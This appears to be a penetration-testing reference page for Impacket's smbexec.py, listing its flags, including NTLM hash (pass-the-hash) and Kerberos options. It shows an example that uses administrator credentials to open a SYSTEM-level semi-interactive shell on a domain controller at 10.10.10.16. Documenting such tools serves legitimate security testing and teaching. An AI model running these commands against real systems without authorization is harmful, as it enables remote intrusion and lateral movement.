---
title : "smbexec.py"
# pre : ' '
description : "PSEXEC over SMB."
date : 2022-02-14T14:52:35+01:00
# hidden : true
# draft : true
weight : 120
# tags : ['']
---

---

PSEXEC over SMB.

## Installation

Install [Impacket]({{< ref "../impacket" >}}).

## Usage

```plain
smbexec.py [-h] [-share SHARE] [-mode {SERVER,SHARE}] [-ts] [-debug] [-codec CODEC] [-shell-type {cmd,powershell}] [-dc-ip ip address] [-target-ip ip address] [-port [destination port]] [-service-name service_name]
                  [-hashes LMHASH:NTHASH] [-no-pass] [-k] [-aesKey hex key] [-keytab KEYTAB]
                  target
```

## Flags

```plain
Impacket v0.12.0.dev1+20240718.115833.4e0e3174 - Copyright 2023 Fortra

positional arguments:
  target                [[domain/]username[:password]@]<targetName or address>

options:
  -h, --help            show this help message and exit
  -share SHARE          share where the output will be grabbed from (default C$)
  -mode {SERVER,SHARE}  mode to use (default SHARE, SERVER needs root!)
  -ts                   adds timestamp to every logging output
  -debug                Turn DEBUG output ON
  -codec CODEC          Sets encoding used (codec) from the target's output (default "utf-8"). If errors are detected, run chcp.com at the target, map the result with https://docs.python.org/3/library/codecs.html#standard-encodings
                        and then execute smbexec.py again with -codec and the corresponding codec
  -shell-type {cmd,powershell}
                        choose a command processor for the semi-interactive shell

connection:
  -dc-ip ip address     IP Address of the domain controller. If omitted it will use the domain part (FQDN) specified in the target parameter
  -target-ip ip address
                        IP Address of the target machine. If ommited it will use whatever was specified as target. This is useful when target is the NetBIOS name and you cannot resolve it
  -port [destination port]
                        Destination port to connect to SMB Server
  -service-name service_name
                        The name of theservice used to trigger the payload

authentication:
  -hashes LMHASH:NTHASH
                        NTLM hashes, format is LMHASH:NTHASH
  -no-pass              don't ask for password (useful for -k)
  -k                    Use Kerberos authentication. Grabs credentials from ccache file (KRB5CCNAME) based on target parameters. If valid credentials cannot be found, it will use the ones specified in the command line
  -aesKey hex key       AES key to use for Kerberos Authentication (128 or 256 bits)
  -keytab KEYTAB        Read keys for SPN from keytab file
```

## Examples

{{%resources fa_icon_class="far fa-file-video" pattern="smbexec.mp4"/%}}

### Start RCE via SMB

```plain
smbexec.py <domain>/<domain-or-local-admin-or-user>:<password>@<domain-controller-ip>
```

```plain
smbexec.py offsec.nl/administrator:Welkom1234@10.10.10.16

Impacket v0.9.20 - Copyright 2019 SecureAuth Corporation

[!] Launching semi-interactive shell - Careful what you execute
C:\Windows\system32>whoami
nt authority\system

C:\Windows\system32>
```

## URL List

- [Github.com - smbexec.py](https://github.com/fortra/impacket/blob/master/examples/smbexec.py)
